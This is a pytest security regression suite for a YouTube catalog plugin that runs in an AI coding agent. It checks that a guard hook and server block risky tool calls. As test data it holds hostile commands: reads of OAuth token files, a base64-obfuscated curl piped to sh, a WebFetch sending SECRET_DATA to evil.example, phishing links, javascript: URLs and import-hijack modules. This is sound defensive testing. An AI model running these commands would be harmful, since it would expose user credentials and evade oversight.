"""Security regression tests (security review findings S-01…S-18).

Ported from the reviewer's experiments (guard probes, server tests, cwd hijack)
with INVERTED assertions: a test passes when the vulnerability is fixed.
"""
import asyncio
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from conftest import HOOKS_DIR, call, hook_json, run_hook

P = "mcp__plugin_yt-media-feed-helper_ytfeed__"
SUB = {"agent_id": "a-1", "agent_type": "yt-media-feed-helper:scout"}
LAUNCH = Path(__file__).resolve().parent.parent / "server" / "launch.py"
APPDATA = os.environ.get("APPDATA", r"C:\Users\u\AppData\Roaming")
win = pytest.mark.skipif(os.name != "nt", reason="Windows paths")

sys.path.insert(0, str(HOOKS_DIR))
import _common as C  # noqa: E402


def pay(ws, tool, inp, mode="default", session="s-reg", **extra):
    return {"session_id": session, "hook_event_name": "PreToolUse", "cwd": str(ws), "permission_mode": mode, "tool_name": tool,
            "tool_input": inp, "tool_use_id": "toolu_r", **extra}


def decide(payload, **env):
    cp = run_hook("guard_pretool.py", payload, env)
    assert cp.returncode == 0, cp.stderr.decode("utf-8", "replace")
    out = hook_json(cp)
    return None if out is None else out["hookSpecificOutput"]["permissionDecision"]


def reason(payload, **env):
    return hook_json(run_hook("guard_pretool.py", payload, env))["hookSpecificOutput"]["permissionDecisionReason"]


@pytest.fixture
def wsdir(ws):
    return ws.root


# ---- S-01: the catalog and guard settings are not controlled by workspace files ------------------------------
@pytest.mark.parametrize("tool,rel,mode,sub,expected", [
    ("Edit", "catalog/channels.yaml", "acceptEdits", False, "ask"),
    ("Edit", "catalog/channels.yaml", "bypassPermissions", False, "deny"),
    ("Edit", "catalog/channels.yaml", "auto", False, "deny"),
    ("Edit", "catalog/config.yaml", "auto", False, "deny"),
    ("Edit", "catalog/taxonomy.yaml", "default", False, "ask"),
    ("Write", "catalog/proposals/UCx.json", "default", False, "ask"),
    ("Write", "catalog/history.jsonl", "default", False, "ask"),
    ("Write", "reports/../catalog/history.jsonl", "default", False, "ask"),
    ("MultiEdit", "catalog/channels.yaml", "default", True, "deny"),
])
def test_s01_catalog_file_edits(wsdir, tool, rel, mode, sub, expected):
    inp = {"file_path": f"{wsdir}/{rel}", "old_string": "strict_modes: true", "new_string": "strict_modes: false"}
    assert decide(pay(wsdir, tool, inp, mode=mode, **(SUB if sub else {}))) == expected


@pytest.mark.parametrize("tool,cmd,sub,expected", [
    ("Bash", "sed -i 's/pending/approved/' {w}/catalog/channels.yaml", False, "ask"),
    ("Bash", "python -c \"open(r'{w}/catalog/channels.yaml','a').write('x')\"", True, "deny"),
    ("PowerShell", "Set-Content {w}/catalog/config.yaml 'guard:'", False, "ask"),
    ("Bash", "echo x > {w}/catalog/proposals/UCfake.json", False, "ask"),
    ("Bash", "python validate_catalog.py --workspace {w} --fix-synonyms", False, "ask"),
    ("Bash", "cat {w}/catalog/channels.yaml 2>/dev/null | head", False, None),
    ("Bash", "grep -n status {w}/catalog/channels.yaml", False, None),
])
def test_s01_catalog_shell_writes(wsdir, tool, cmd, sub, expected):
    assert decide(pay(wsdir, tool, {"command": cmd.format(w=str(wsdir).replace("\\", "/"))}, **(SUB if sub else {}))) == expected


def test_s01_config_tamper_cannot_disable_strict_modes(wsdir, ws):
    cfg = ws.config_file.read_text(encoding="utf-8")
    ws.config_file.write_text(cfg.replace("scope: workspace_only", "scope: workspace_only\n  strict_modes: false")
                              .replace("budget_units: 2000", "budget_units: 99999"), encoding="utf-8")
    for mode in ("auto", "bypassPermissions", "dontAsk"):
        assert decide(pay(wsdir, P + "catalog_commit", {"decisions": [{}]}, mode=mode)) == "deny"
    # round 2 (§5a-2): a config.yaml budget > 2000 is ignored (server and hook) — raising only via userConfig
    assert decide(pay(wsdir, P + "quota_estimate", {"plan": [], "begin_report": True})) is None
    assert decide(pay(wsdir, P + "quota_estimate", {"plan": [], "budget_units": 9000})) == "ask"


def test_r2_budget_only_from_user_config(app, ws, monkeypatch, wsdir):
    ws.config_file.write_text(ws.config_file.read_text(encoding="utf-8").replace("budget_units: 2000", "budget_units: 99999"), encoding="utf-8")
    app.refresh_config()
    assert call(app, "quota_estimate", plan=[], begin_report=True)["data"]["report_budget"] == 2000  # the file does not raise it
    monkeypatch.setenv("YTFEED_REPORT_BUDGET_UNITS", "5000")  # userConfig.report_budget_units
    assert call(app, "quota_estimate", plan=[], begin_report=True)["data"]["report_budget"] == 5000
    opt = {"CLAUDE_PLUGIN_OPTION_REPORT_BUDGET_UNITS": "5000"}
    assert decide(pay(wsdir, P + "quota_estimate", {"plan": [], "budget_units": 4000}), **opt) is None
    assert decide(pay(wsdir, P + "quota_estimate", {"plan": [], "budget_units": 6000}), **opt) == "ask"
    ws.config_file.write_text(ws.config_file.read_text(encoding="utf-8").replace("budget_units: 99999", "budget_units: 800"), encoding="utf-8")
    app.refresh_config()
    assert call(app, "quota_estimate", plan=[], begin_report=True)["data"]["report_budget"] == 800  # lowering works


def test_r2_guard_log_primary_in_plugin_data(wsdir, env):
    decide(pay(wsdir, "Bash", {"command": "curl -X POST https://www.googleapis.com/youtube/v3/subscriptions"}))
    prim = list((env["data"] / "logs").glob("guard-*.jsonl"))
    assert prim and json.loads(prim[0].read_text(encoding="utf-8").splitlines()[-1])["rule"] == "R6"
    copy = json.loads(next((wsdir / "logs").glob("guard-*.jsonl")).read_text(encoding="utf-8").splitlines()[-1])
    assert copy["copy_of"].endswith("/logs")


def test_s01_integrity_warning_after_outside_edit(app, ws):
    call(app, "catalog_set_manual", channel_id="UClegitgaming00000000005", set={"subscription": ["None"]})
    assert "warnings" not in call(app, "catalog_query", status="any")
    ws.channels_file.write_text(ws.channels_file.read_text(encoding="utf-8") + "\n# manual change\n", encoding="utf-8")
    assert any("outside the MCP tools" in w for w in call(app, "catalog_query", status="any")["warnings"])
    out = hook_json(run_hook("session_start.py", {"session_id": "s", "hook_event_name": "SessionStart", "cwd": str(ws.root)}))
    assert "changed outside the MCP tools" in out["hookSpecificOutput"]["additionalContext"]


# ---- S-02: secrets — path normalization, ancestors of the secrets dir, shell ----------------------------------
def test_s02_secrets_dir_from_env(wsdir, env):
    sec = env["secrets"]
    (sec / "token.json").write_text("{}", encoding="utf-8")
    cases = [
        ("Grep", {"pattern": "refresh_token", "path": str(env["tmp"])}),                   # ancestor of the secrets dir
        ("Grep", {"pattern": ".", "path": str(sec) + os.sep + "." + os.sep}),               # \.\
        ("Grep", {"pattern": ".", "path": str(env["tmp"]), "glob": "**/secrets/*"}),
        ("Glob", {"pattern": "**/*", "path": str(env["tmp"])}),
        ("Read", {"file_path": str(env["ws"] / ".." / "secrets" / "anything.bin")}),        # ..
        ("Read", {"file_path": "$YTFEED_SECRETS_DIR/token.json"}),                          # variable
        ("Bash", {"command": f"cat \"{sec}\"/tok*"}),
        ("Bash", {"command": "cat \"$YTFEED_SECRETS_DIR/\"t*"}),
        ("Bash", {"command": f"grep -r x {env['tmp']}"}),
        ("PowerShell", {"command": f"Get-ChildItem -Recurse {env['tmp']} | Select-String refresh"}),
    ]
    for tool, inp in cases:
        assert decide(pay(wsdir, tool, inp)) == "deny", (tool, inp)
    assert decide(pay(wsdir, "Grep", {"pattern": "x", "path": str(env["ws"])})) is None  # sibling — not blocked


@win
@pytest.mark.parametrize("tool,inp", [
    ("Grep", {"pattern": "refresh_token", "path": APPDATA, "output_mode": "content"}),
    ("Grep", {"pattern": ".", "path": APPDATA + r"\.\yt-media-feed-helper", "output_mode": "content"}),
    ("Grep", {"pattern": ".", "path": APPDATA, "glob": "**/yt-media-feed-helper/*"}),
    ("Grep", {"pattern": "x", "path": "~"}),
    ("Read", {"file_path": "%APPDATA%\\yt-media-feed-helper\\TOKEN~1.JSO"}),
    ("Bash", {"command": "cat \"$APPDATA/yt-media-feed-helper/\"tok*"}),
    ("Bash", {"command": "cd ~/AppData/Roaming && cat yt-media-feed-helper/*.json"}),
    ("Bash", {"command": "grep -r refresh_token ~/AppData/Roaming/"}),
    ("Bash", {"command": "find ~ -name 'tok*.js*' -path '*feed-helper*' -exec cat {} +"}),
    ("PowerShell", {"command": "gc (Join-Path $env:APPDATA 'yt-media-feed-helper') -Filter *.json"}),
    ("NotebookRead", {"notebook_path": APPDATA + r"\yt-media-feed-helper\token.json"}),
])
def test_s02_appdata_probes(wsdir, tool, inp):
    assert decide(pay(wsdir, tool, inp)) == "deny"


def test_s02_client_secret_option_path(wsdir, env):
    dl = env["tmp"] / "downloads"
    dl.mkdir()
    cs = dl / "my_oauth_app.json"
    cs.write_text("{}", encoding="utf-8")
    e = {"CLAUDE_PLUGIN_OPTION_GOOGLE_CLIENT_SECRET_PATH": str(cs)}
    assert decide(pay(wsdir, "Read", {"file_path": str(cs)}), **e) == "deny"
    assert decide(pay(wsdir, "Grep", {"pattern": "secret", "path": str(dl)}), **e) == "deny"
    assert decide(pay(wsdir, "Read", {"file_path": str(cs)})) is None  # without the option it is a regular file


@win
def test_s02_plugin_paths_not_blocked(wsdir):
    for cmd in ('python "C:/Users/u/.claude/plugins/cache/m/yt-media-feed-helper/0.1.0/server/launch.py" doctor',
                "python D:/proj/yt-media-feed-helper/tests/x.py", "rg TODO src"):
        assert decide(pay(wsdir, "Bash", {"command": cmd})) is None, cmd


# ---- S-03: browser / computer-use / foreign MCP -----------------------------------------------------------------
def test_s03_browser_on_youtube_needs_consent(wsdir):
    nav = ("mcp__claude-in-chrome__navigate", {"url": "https://www.youtube.com/@paradox"})
    assert decide(pay(wsdir, *nav, session="b1")) == "ask"
    assert decide(pay(wsdir, *nav, session="b1", **SUB)) == "deny"
    assert decide(pay(wsdir, *nav, session="b1", mode="bypassPermissions")) == "deny"
    assert decide(pay(wsdir, *nav, session="b1", mode="auto")) == "deny"
    # click without a URL, but in a session that opened YouTube
    assert decide(pay(wsdir, "mcp__claude-in-chrome__computer", {"action": "left_click", "coordinate": [10, 10]}, session="b1")) == "ask"
    # after navigating to another site a click needs no plugin approval
    assert decide(pay(wsdir, "mcp__claude-in-chrome__navigate", {"url": "https://docs.python.org/3/"}, session="b1")) is None
    assert decide(pay(wsdir, "mcp__claude-in-chrome__computer", {"action": "left_click"}, session="b1")) is None


@pytest.mark.parametrize("tool,inp,expected", [
    ("mcp__browser__navigate", {"url": "https://www.youtube.com/channel/x?sub_confirmation=1"}, "deny"),
    ("mcp__browser__click", {"ref": "Subscribe button"}, "ask"),
    ("mcp__computer-use__type", {"text": "Świetny film! #komentarz"}, "ask"),  # Polish mutation keyword (detection data)
    ("mcp__playwright__browser_navigate", {"url": "https://store.steampowered.com/app/3450310"}, "ask"),
    ("mcp__shell__run_command", {"cmd": "curl -X POST https://www.googleapis.com/youtube/v3/subscriptions"}, "deny"),
    ("mcp__fs__read_file", {"path": APPDATA + "/yt-media-feed-helper/token.json"}, "deny"),
    ("mcp__ytfeed__catalog_commit", {"decisions": []}, "ask"),              # foreign server named ytfeed
    ("mcp__plugin_evil_ytfeed__catalog_commit", {"decisions": []}, "ask"),
    ("mcp__docs__search", {"q": "python"}, None),
])
def test_s03_foreign_mcp(wsdir, tool, inp, expected):
    assert decide(pay(wsdir, tool, inp, session="f-" + tool)) == expected


# ---- S-04: MCP server isolated from the working directory -------------------------------------------------------
def test_s04_cwd_module_hijack_blocked(env):
    repo = env["tmp"] / "evil-repo"
    (repo / "ytfeed").mkdir(parents=True)
    (repo / "yaml.py").write_text("import sys\nsys.stderr.write('HIJACKED yaml.py from cwd')\nraise SystemExit(0)\n", encoding="utf-8")
    (repo / "ytfeed" / "__init__.py").write_text("import sys\nsys.stderr.write('HIJACKED ytfeed from cwd')\n", encoding="utf-8")
    (repo / "ytfeed" / "server.py").write_text("import sys\nsys.stderr.write('HIJACKED server')\n", encoding="utf-8")
    e = {k: v for k, v in os.environ.items() if k not in ("YTFEED_WORKSPACE", "PYTHONPATH")}
    e.update(YTFEED_SKIP_VENV="1", PYTHONPATH=str(repo), PYTHONSTARTUP=str(repo / "yaml.py"))
    cp = subprocess.run([sys.executable, "-I", str(LAUNCH), "serve"], cwd=str(repo), env=e, stdin=subprocess.DEVNULL,
                        capture_output=True, timeout=120)
    err = cp.stderr.decode("utf-8", "replace")
    assert "HIJACKED" not in err, err[-500:]
    assert (repo / "catalog" / "taxonomy.yaml").exists()  # workspace = project dir (YTFEED_PROJECT_DIR), not the server cwd


# ---- S-05: strict types (hook: ambiguous → ask; server: no coercion) ---------------------------------------------
@pytest.mark.parametrize("tool,inp,sub,expected", [
    ("catalog_sync_subscriptions", {"dry_run": "false"}, False, "ask"),
    ("catalog_sync_subscriptions", {"dry_run": 0}, False, "ask"),
    ("catalog_sync_subscriptions", {"dry_run": "no"}, True, "deny"),
    ("catalog_sync_subscriptions", {"dry_run": True}, False, None),
    ("quota_estimate", {"plan": [], "begin_report": True, "budget_units": "9000.0"}, False, "ask"),
    ("quota_estimate", {"plan": [], "begin_report": True, "budget_units": 9000.0}, False, "ask"),
    ("quota_estimate", {"plan": [], "begin_report": "yes"}, False, "ask"),
    ("report_save", {"topic_slug": "x", "strict": False}, False, "ask"),                # S-17
    ("report_save", {"topic_slug": "x", "strict": "false"}, True, "deny"),
])
def test_s05_ambiguous_args(wsdir, tool, inp, sub, expected):
    assert decide(pay(wsdir, P + tool, inp, **(SUB if sub else {}))) == expected


def _mcp_call(tool, args):
    from mcp import Client

    from ytfeed.server import mcp

    async def run():
        async with Client(mcp) as c:
            r = await c.call_tool(tool, args)
            return r.content[0].text

    return asyncio.run(run())


@pytest.mark.parametrize("tool,args", [
    ("catalog_sync_subscriptions", {"dry_run": "false"}),
    ("catalog_sync_subscriptions", {"dry_run": 0}),
    ("quota_estimate", {"plan": [], "begin_report": True, "budget_units": "9000.0"}),
    ("report_save", {"topic_slug": "abc", "title": "t", "markdown": "# x", "strict": "false"}),
])
def test_s05_server_rejects_coercion(ws, tool, args):
    before = ws.channels_file.read_text(encoding="utf-8")
    text = _mcp_call(tool, args)
    try:
        env = json.loads(text)
        assert env.get("ok") is False, text[:300]
    except json.JSONDecodeError:
        assert "validation" in text.lower() or "error" in text.lower(), text[:300]
    assert ws.channels_file.read_text(encoding="utf-8") == before


# ---- S-06: links in the report ------------------------------------------------------------------------------------
def _register(app, title):
    app.evidence.register("yt:v:EVILVID0001", title=title, published_at="2026-11-01T00:00:00Z", channel="UCx")


def _report(body):
    return ("# T\n\n## TL;DR\n<!-- section:tldr -->\n\n- Something happened [[yt:v:EVILVID0001]]\n\n" + body +
            "\n## Methodology and limitations\n<!-- section:methodology -->\n\nSmall sample.\n")


def test_s06_sources_title_escaped(app):
    _register(app, "Patch notes](https://evil.example/phish) [x")
    env = call(app, "report_save", topic_slug="inj-title", title="t", markdown=_report(""))
    assert env["ok"], env
    text = (app.ws.root / env["data"]["path"]).read_text(encoding="utf-8")
    assert "](https://evil.example/phish)" not in text and "[link](https://www.youtube.com/watch?v=EVILVID0001)" in text


@pytest.mark.parametrize("body", [
    "_See the [official FAQ](HTTPS://evil.example/login)_\n",
    "_More: [here](//evil.example/x)_\n",
    "_More: www.evil.example/a_\n",
    "_![](//evil.example/pixel.png?c=subs)_\n",
    "_[click](javascript:alert(1))_\n",
    "\n[ref]: //evil.example/y\n",
    "\n[r2]: <javascript:alert(1)>\n",
    "_<a href=\"https://evil.example\">x</a>_\n",
    "_Link <https://evil.example/z>_\n",
])
def test_s06_link_validator(app, body):
    _register(app, "ok")
    env = call(app, "report_save", topic_slug="inj-link", title="t", markdown=_report(body))
    assert not env["ok"] and env["error"]["code"] == "VALIDATION_FAILED", body


def test_s06_metadata_links_rejected(app):
    _register(app, "ok")
    assert not call(app, "report_save", topic_slug="inj-fm", title="Kliknij https://evil.example/x", markdown=_report(""))["ok"]
    assert not call(app, "report_save", topic_slug="inj-fm2", title="t", markdown=_report(""), query_spec={"see": "https://evil.example/phish"})["ok"]
    assert call(app, "report_save", topic_slug="ok-fm", title="t", markdown=_report(""), query_spec={"mode": "news"})["ok"]


# ---- S-07: catalog_commit approval text + manual-only values -----------------------------------------------------
def test_s07_commit_reason_shows_content(app, ws):
    from ytfeed.catalog import proposals, taxonomy

    app.evidence.register("yt:ch:UClegitgaming00000000005", title="Legit")
    proposals.propose(ws, taxonomy.load(ws), app.evidence, "UClegitgaming00000000005",
                      {"communication": [{"value": "Official", "confidence": 0.9, "rationale": "x"}]}, [], None)
    pid = proposals.read(ws, "UClegitgaming00000000005")["proposal_id"]
    r = reason(pay(ws.root, P + "catalog_commit", {"decisions": [{"proposal_id": pid, "action": "accept_with_changes",
                                                                  "overrides": {"content": ["Gaming"]}}]}))
    assert "UClegitgaming00000000005" in r and "communication=Official" in r and "Gaming" in r and "CORRECTIONS" in r
    env = call(app, "catalog_commit", decisions=[{"proposal_id": pid, "action": "accept_with_changes", "overrides": {"subscription": ["Supporter"]}}])
    assert not env["ok"] and "catalog_set_manual" in env["error"]["message"]


# ---- S-09: log redaction ------------------------------------------------------------------------------------------
def test_s09_redaction_gaps_closed():
    out = C.redact("Authorization: Basic dXNlcjpzZWNyZXRwYXNz")
    assert "dXNlcjpzZWNyZXRwYXNz" not in out
    assert "0123456789ABCDEF0123456789ABCDEF" not in C.redact("my key is 0123456789ABCDEF0123456789ABCDEF")
    obj, _ = C.redact_obj({"access_token": "opaqueTokenValue123", "steam_api_key": "k", "headers": {"Authorization": "Basic dXNlcjpw"},
                           "password": "hunter2", "query": "ok"})
    s = json.dumps(obj)
    assert "opaqueTokenValue123" not in s and "dXNlcjpw" not in s and "hunter2" not in s and obj["query"] == "ok"


def test_s09_outside_workspace_no_args(env):
    other = env["tmp"] / "other"
    other.mkdir()
    run_hook("diag_log.py", {"session_id": "s", "hook_event_name": "PreToolUse", "cwd": str(other), "tool_name": "mcp__x__y",
                             "tool_input": {"note": "PRYWATNE"}, "tool_use_id": "t"}, {"YTFEED_WORKSPACE": ""})
    raw = next((env["data"] / "logs").glob("diag-*.jsonl")).read_text(encoding="utf-8")
    assert "PRYWATNE" not in raw


# ---- S-10 / S-11: token at rest -----------------------------------------------------------------------------------
@win
def test_s10_dpapi_roundtrip_and_migration(env):
    from ytfeed.auth import SCOPE, AuthManager, read_token, write_token

    cs = env["secrets"] / "client_secret.json"
    cs.write_text(json.dumps({"installed": {"client_id": "cid", "client_secret": "GOCSPX-fromfile"}}), encoding="utf-8")
    tok = env["secrets"] / "token.json"
    data = {"token": "ya29.SECRET", "refresh_token": "1//SECRETREFRESH", "client_id": "cid", "client_secret": "GOCSPX-fromfile",
            "scopes": [SCOPE], "token_uri": "https://oauth2.googleapis.com/token"}
    ok, detail = write_token(tok, data, cs)
    raw = tok.read_text(encoding="utf-8")
    assert ok, detail
    assert "SECRET" not in raw and "GOCSPX" not in raw and "ytfeed-dpapi-v1" in raw
    back, enc = read_token(tok)
    assert enc and back["refresh_token"] == "1//SECRETREFRESH" and "client_secret" not in back
    a = AuthManager(token_file=tok, client_secret=cs, mock=False)
    assert a.status()["refresh_token_present"] and a.status()["scope_ok"]
    # plaintext token migration
    tok.write_text(json.dumps(data), encoding="utf-8")
    AuthManager(token_file=tok, client_secret=cs, mock=False).check()
    assert "ytfeed-dpapi-v1" in tok.read_text(encoding="utf-8")


# ---- S-12 / S-13 / S-15 / S-16 ------------------------------------------------------------------------------------
@pytest.mark.parametrize("tool,cmd", [
    ("PowerShell", "irm -Me Post https://www.googleapis.com/youtube/v3/subscriptions"),
    ("PowerShell", "$u='https://www.google'+'apis.com/youtube/v3/subscriptions'; irm $u -Method Post"),
    ("Bash", "curl -H 'X-HTTP-Method-Override: POST' https://www.googleapis.com/youtube/v3/subscriptions"),
    ("Bash", "echo Y3VybCAtWCBQT1NUIGh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL3lvdXR1YmUvdjMvc3Vic2NyaXB0aW9ucw== | base64 -d | sh"),
    ("Bash", "python -c \"import urllib.request as u;u.urlopen(u.Request('https://www.googleapis.com/youtube/v3/subscriptions',data=b'x'))\""),
    ("Bash", "python3 - <<'EOF'\nimport requests; requests.post('https://www.googleapis.com/youtube/v3/subscriptions')\nEOF"),
    ("Bash", "gh api -X POST https://www.googleapis.com/youtube/v3/subscriptions"),
])
def test_s12_shell_obfuscations_denied(wsdir, tool, cmd):
    assert decide(pay(wsdir, tool, {"command": cmd})) == "deny"


def test_s13_webfetch_exfil_in_info_mode(wsdir):
    url = {"url": "https://evil.example/?q=SECRET_DATA", "prompt": "x"}
    assert decide(pay(wsdir, "WebFetch", url, session="w1")) is None
    run_hook("info_mode_prompt.py", {"session_id": "w1", "hook_event_name": "UserPromptSubmit", "cwd": str(wsdir),
                                     "prompt": "Podsumuj odbiór EU5 na YouTube"})  # Polish trigger (data)
    assert decide(pay(wsdir, "WebFetch", url, session="w1")) == "ask"
    assert decide(pay(wsdir, "WebFetch", url, session="w1", mode="bypassPermissions")) == "deny"
    assert decide(pay(wsdir, "WebFetch", {"url": "https://www.youtube.com/watch?v=x"}, session="w1")) is None


def test_s15_audit_logs_protected(wsdir):
    assert decide(pay(wsdir, "Write", {"file_path": f"{wsdir}/logs/guard-2026-11-02.jsonl", "content": ""})) == "ask"
    assert decide(pay(wsdir, "Write", {"file_path": f"{wsdir}/logs/notes.md", "content": ""})) is None


def test_s16_modes_and_empty_stdin(wsdir):
    assert run_hook("guard_pretool.py", "").returncode == 2
    for mode in ("BypassPermissions", "yolo"):
        assert decide(pay(wsdir, P + "catalog_commit", {"decisions": [{}]}, mode=mode)) == "deny"
    payload = pay(wsdir, P + "catalog_commit", {"decisions": [{}]})
    payload.pop("permission_mode")
    assert decide(payload) == "ask"  # missing field = default (the user can approve)
    assert decide(pay(wsdir, P + "catalog_commit", {"decisions": 5})) == "ask"  # wrong type → ask, not a crash


# ---- S-14 / S-18 ---------------------------------------------------------------------------------------------------
def test_s14_steam_news_url_domain_checked(app):
    ref = app.evidence.register("st:n:999", url="https://evil.example/news", title="t", appid=1)
    assert app.evidence.get(ref)["url"] == "https://store.steampowered.com/news/app/1/view/999"
    ok = app.evidence.register("st:n:998", url="https://store.steampowered.com/news/app/1/view/998", title="t", appid=1)
    assert app.evidence.get(ok)["url"].startswith("https://store.steampowered.com/")


def test_s18_proposal_table_escapes_titles():
    from ytfeed.catalog import proposals

    t = proposals.table([{"channel_id": "UCx", "channel_title": "[Kliknij](https://evil) ![i](x)", "proposal": {}, "proposal_id": "UCx@1"}])
    assert "[Kliknij](https://evil)" not in t and "\\[Kliknij\\]" in t
